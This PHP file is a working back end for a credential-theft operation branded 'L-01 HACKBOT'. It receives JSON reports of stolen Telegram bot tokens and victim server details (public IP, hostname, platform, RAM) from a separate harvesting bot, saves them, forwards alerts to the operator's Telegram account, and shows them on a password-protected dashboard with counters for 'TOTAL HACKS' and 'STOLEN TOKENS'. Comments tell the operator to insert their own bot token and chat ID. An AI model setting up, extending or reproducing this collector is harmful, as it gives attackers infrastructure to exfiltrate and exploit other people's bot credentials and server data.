<?php
/**
 * ============================================================
 * 🔥 L-01 WEBHOOK ULTIMATE v3.0 🔥
 * 📡 Auto Capture Bot Tokens | Panel IP | System Info
 * 👑 Created by @Aboutritxz | L-01 Qwerty Company
 * ⚡ XXO - REAL-TIME MONITORING | FULL DASHBOARD
 * ============================================================
 */

// ========== KONFIGURASI ==========
$DATA_FILE = 'hack_results.json';
$LOG_FILE = 'hack_logs.txt';
$BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Ganti pake token bot lo
$ADMIN_CHAT_ID = 'YOUR_TELEGRAM_ID_HERE'; // Ganti pake ID Telegram lo
$SECRET_KEY = 'L01_XXO_SECRET_2024';
$PASSWORD = 'admin123'; // Password buat akses dashboard (ganti sesuai keinginan)

// ========== FUNGSI ==========
function logMessage($message) {
    global $LOG_FILE;
    $log = date('[Y-m-d H:i:s] ') . $message . PHP_EOL;
    file_put_contents($LOG_FILE, $log, FILE_APPEND);
}

function sendToTelegram($message) {
    global $BOT_TOKEN, $ADMIN_CHAT_ID;
    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
    $data = [
        'chat_id' => $ADMIN_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

function saveData($data) {
    global $DATA_FILE;
    
    $existing = [];
    if (file_exists($DATA_FILE)) {
        $existing = json_decode(file_get_contents($DATA_FILE), true);
        if (!is_array($existing)) $existing = [];
    }
    
    $data['id'] = uniqid();
    $data['timestamp'] = date('Y-m-d H:i:s');
    $data['ip_address'] = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $data['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    
    array_unshift($existing, $data);
    
    // Keep last 500 records
    if (count($existing) > 500) {
        $existing = array_slice($existing, 0, 500);
    }
    
    file_put_contents($DATA_FILE, json_encode($existing, JSON_PRETTY_PRINT));
    return $data['id'];
}

function clearAllData() {
    global $DATA_FILE, $LOG_FILE;
    file_put_contents($DATA_FILE, json_encode([]));
    file_put_contents($LOG_FILE, '');
    return true;
}

function getStats($data) {
    $totalTokens = 0;
    $uniqueIPs = [];
    foreach ($data as $item) {
        if (isset($item['tokens'])) {
            $totalTokens += count($item['tokens']);
        }
        if (isset($item['panel']['publicIP'])) {
            $uniqueIPs[] = $item['panel']['publicIP'];
        }
    }
    return [
        'total_hacks' => count($data),
        'total_tokens' => $totalTokens,
        'unique_ips' => count(array_unique($uniqueIPs)),
        'last_hack' => $data[0]['timestamp'] ?? 'Never'
    ];
}

// ========== AUTHENTICATION ==========
function isAuthenticated() {
    global $PASSWORD;
    if (isset($_COOKIE['hackbot_auth']) && $_COOKIE['hackbot_auth'] === md5($PASSWORD)) {
        return true;
    }
    return false;
}

function showLogin() {
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>L-01 HACKBOT - LOGIN</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
                font-family: 'Courier New', monospace;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .login-box {
                background: rgba(0,0,0,0.8);
                border: 2px solid #0ff;
                border-radius: 20px;
                padding: 40px;
                width: 350px;
                text-align: center;
                box-shadow: 0 0 50px rgba(0,255,255,0.3);
            }
            .glitch {
                font-size: 28px;
                color: #0ff;
                text-shadow: 2px 2px 0 #f0f;
                margin-bottom: 30px;
            }
            input {
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                background: #000;
                border: 1px solid #0ff;
                color: #0ff;
                font-family: monospace;
                border-radius: 5px;
            }
            button {
                width: 100%;
                padding: 12px;
                background: linear-gradient(45deg, #f0f, #0ff);
                border: none;
                color: #000;
                font-weight: bold;
                cursor: pointer;
                border-radius: 5px;
                margin-top: 10px;
                font-family: monospace;
            }
            button:hover { transform: scale(1.02); }
            .error { color: #f33; margin-top: 10px; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="glitch">💀 L-01 HACKBOT 💀</div>
            <form method="POST">
                <input type="password" name="password" placeholder="ENTER PASSWORD" autocomplete="off">
                <button type="submit">🔓 ACCESS DASHBOARD</button>
            </form>
            <?php if (isset($_POST['password']) && $_POST['password'] !== $GLOBALS['PASSWORD']): ?>
                <div class="error">❌ INVALID PASSWORD!</div>
            <?php endif; ?>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ========== HANDLE POST DATA FROM BOT ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['password'])) {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input) {
        http_response_code(400);
        die(json_encode(['error' => 'Invalid JSON']));
    }
    
    // Save data
    $id = saveData($input);
    logMessage("✅ Data saved! ID: {$id} | Tokens: " . count($input['tokens'] ?? []));
    
    // Format message for Telegram
    $message = "🔥 <b>L-01 HACKBOT ALERT!</b> 🔥\n\n";
    $message .= "📍 <b>Panel Info:</b>\n";
    $message .= "• IP: <code>{$input['panel']['publicIP']}</code>\n";
    $message .= "• Hostname: {$input['panel']['hostname']}\n";
    $message .= "• Platform: {$input['panel']['platform']}\n";
    $message .= "• RAM: {$input['panel']['memory']}\n\n";
    
    if (!empty($input['tokens'])) {
        $message .= "🤖 <b>Stolen Tokens (" . count($input['tokens']) . "):</b>\n";
        foreach (array_slice($input['tokens'], 0, 3) as $token) {
            $username = $token['botInfo']['username'] ?? 'unknown';
            $message .= "• @{$username} - <code>" . substr($token['token'], 0, 20) . "...</code>\n";
        }
        if (count($input['tokens']) > 3) {
            $message .= "• ... and " . (count($input['tokens']) - 3) . " more\n";
        }
    }
    
    $message .= "\n📊 <b>Stats:</b>\n";
    $message .= "• Tokens Found: " . count($input['tokens']) . "\n";
    $message .= "• Files Scanned: {$input['stats']['scanned_files']}\n";
    $message .= "• Processes: {$input['stats']['processes']}\n";
    
    sendToTelegram($message);
    
    echo json_encode(['status' => 'success', 'id' => $id]);
    exit;
}

// ========== HANDLE CLEAR DATA ==========
if (isset($_GET['action']) && $_GET['action'] === 'clear' && isAuthenticated()) {
    clearAllData();
    header('Location: ?');
    exit;
}

// ========== HANDLE LOGIN ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if ($_POST['password'] === $PASSWORD) {
        setcookie('hackbot_auth', md5($PASSWORD), time() + 86400 * 30, '/');
        header('Location: ?');
        exit;
    }
}

// ========== CHECK AUTH FOR DASHBOARD ==========
if (!isAuthenticated()) {
    showLogin();
}

// ========== LOAD DATA ==========
$data = [];
if (file_exists($DATA_FILE)) {
    $data = json_decode(file_get_contents($DATA_FILE), true);
    if (!is_array($data)) $data = [];
}
$stats = getStats($data);

// ========== DASHBOARD HTML ==========
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>L-01 HACKBOT DASHBOARD</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #0a0a1a 50%, #1a1a2e 100%);
            font-family: 'Courier New', 'Fira Code', monospace;
            color: #0ff;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        /* Header */
        .header {
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 2px solid #0ff;
            padding-bottom: 20px;
        }
        
        .glitch {
            font-size: 48px;
            font-weight: bold;
            text-shadow: 3px 3px 0 #ff00ff, -3px -3px 0 #00ffff;
            animation: glitch 0.3s infinite;
        }
        
        @keyframes glitch {
            0%, 100% { transform: skew(0deg, 0deg); }
            95% { transform: skew(0deg, 0deg); }
        }
        
        .subtitle {
            font-size: 12px;
            color: #ff66cc;
            letter-spacing: 2px;
        }
        
        /* Stats Cards */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #0ff;
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            backdrop-filter: blur(10px);
            transition: all 0.3s;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }
        
        .stat-value {
            font-size: 48px;
            font-weight: bold;
            color: #ff3366;
            text-shadow: 0 0 10px #ff3366;
        }
        
        .stat-label {
            font-size: 12px;
            color: #0ff;
            margin-top: 10px;
            letter-spacing: 1px;
        }
        
        /* Webhook Box */
        .webhook-box {
            background: #000;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #0ff;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .webhook-url {
            font-family: monospace;
            font-size: 12px;
            word-break: break-all;
            color: #0ff;
        }
        
        .copy-btn {
            background: #0ff;
            border: none;
            padding: 5px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            font-family: monospace;
        }
        
        .copy-btn:hover {
            background: #ff3366;
            color: #fff;
        }
        
        /* Table */
        .data-table {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #0ff;
            border-radius: 15px;
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid rgba(0, 255, 255, 0.2);
        }
        
        th {
            background: rgba(0, 255, 255, 0.1);
            color: #0ff;
            font-weight: bold;
            font-size: 12px;
        }
        
        td {
            font-size: 11px;
            font-family: monospace;
        }
        
        tr:hover {
            background: rgba(0, 255, 255, 0.05);
        }
        
        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 9px;
            font-weight: bold;
        }
        
        .badge-success {
            background: #00ff00;
            color: #000;
        }
        
        .badge-warning {
            background: #ff6600;
            color: #000;
        }
        
        .badge-danger {
            background: #ff3366;
            color: #fff;
        }
        
        .token-preview {
            background: #1a1a2e;
            padding: 2px 5px;
            border-radius: 3px;
            font-size: 9px;
            cursor: pointer;
        }
        
        /* Buttons */
        .action-buttons {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .btn {
            padding: 8px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-family: monospace;
            font-weight: bold;
            transition: all 0.3s;
        }
        
        .btn-refresh {
            background: linear-gradient(45deg, #0ff, #00ccff);
            color: #000;
        }
        
        .btn-clear {
            background: linear-gradient(45deg, #ff3366, #ff00cc);
            color: #fff;
        }
        
        .btn:hover {
            transform: scale(1.05);
        }
        
        /* Status */
        .status-bar {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,0,0,0.8);
            padding: 8px 15px;
            border-radius: 5px;
            font-size: 10px;
            border-left: 3px solid #0ff;
        }
        
        .live {
            color: #ff3366;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .glitch { font-size: 28px; }
            .stat-value { font-size: 32px; }
            th, td { padding: 8px; font-size: 9px; }
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: #000;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #0ff;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="glitch">💀 L-01 HACKBOT DASHBOARD 💀</h1>
            <p class="subtitle">⚡ REAL-TIME STOLEN BOT TOKENS MONITOR | XXO LIBERATED MODE ⚡</p>
        </div>
        
        <div class="webhook-box">
            <div class="webhook-url">
                📡 <strong>WEBHOOK URL:</strong> <code id="webhookUrl"><?php echo 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?></code>
            </div>
            <button class="copy-btn" onclick="copyWebhook()">📋 COPY</button>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value"><?php echo $stats['total_hacks']; ?></div>
                <div class="stat-label">TOTAL HACKS</div>
            </div>
            <div class="stat-card">
                <div class="stat-value"><?php echo $stats['total_tokens']; ?></div>
                <div class="stat-label">STOLEN TOKENS</div>
            </div>
            <div class="stat-card">
                <div class="stat-value"><?php echo $stats['unique_ips']; ?></div>
                <div class="stat-label">UNIQUE PANELS</div>
            </div>
            <div class="stat-card">
                <div class="stat-value"><?php echo substr($stats['last_hack'], 0, 10); ?></div>
                <div class="stat-label">LAST HACK</div>
            </div>
        </div>
        
        <div class="action-buttons">
            <button class="btn btn-refresh" onclick="location.reload()">⟳ REFRESH</button>
            <button class="btn btn-clear" onclick="if(confirm('⚠️ Clear all data? This cannot be undone!')) window.location.href='?action=clear'">🗑️ CLEAR ALL</button>
        </div>
        
        <div class="data-table">
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>TIME</th>
                        <th>PANEL IP</th>
                        <th>HOSTNAME</th>
                        <th>TOKENS</th>
                        <th>RAM</th>
                        <th>SOURCE IP</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (empty($data)): ?>
                        <tr>
                            <td colspan="7" style="text-align: center; color: #ff3366;">
                                💀 NO DATA YET. WAITING FOR HACKBOT... 💀
                            </td>
                        </tr>
                    <?php else: ?>
                        <?php $i = 1; foreach (array_slice($data, 0, 100) as $item): ?>
                            <tr>
                                <td><?php echo $i++; ?></td>
                                <td><span style="font-size: 10px;"><?php echo $item['timestamp'] ?? '-'; ?></span></td>
                                <td><code><?php echo $item['panel']['publicIP'] ?? '-'; ?></code></td>
                                <td><?php echo substr($item['panel']['hostname'] ?? '-', 0, 30); ?></td>
                                <td>
                                    <?php if (!empty($item['tokens'])): ?>
                                        <span class="badge badge-success"><?php echo count($item['tokens']); ?> token(s)</span>
                                    <?php else: ?>
                                        <span class="badge badge-warning">0</span>
                                    <?php endif; ?>
                                </td>
                                <td><?php echo $item['panel']['memory'] ?? '-'; ?></td>
                                <td><code><?php echo $item['ip_address'] ?? '-'; ?></code></td>
                            </tr>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
        
        <div class="status-bar">
            <span class="live">● LIVE</span> | 
            Records: <?php echo count($data); ?> | 
            Updated: <span id="lastUpdate"><?php echo date('H:i:s'); ?></span>
        </div>
    </div>
    
    <script>
        function copyWebhook() {
            const url = document.getElementById('webhookUrl').innerText;
            navigator.clipboard.writeText(url);
            alert('✅ Webhook URL copied!');
        }
        
        function refreshData() {
            location.reload();
        }
        
        // Auto refresh every 30 seconds
        setInterval(() => {
            location.reload();
        }, 30000);
    </script>
</body>
</html>
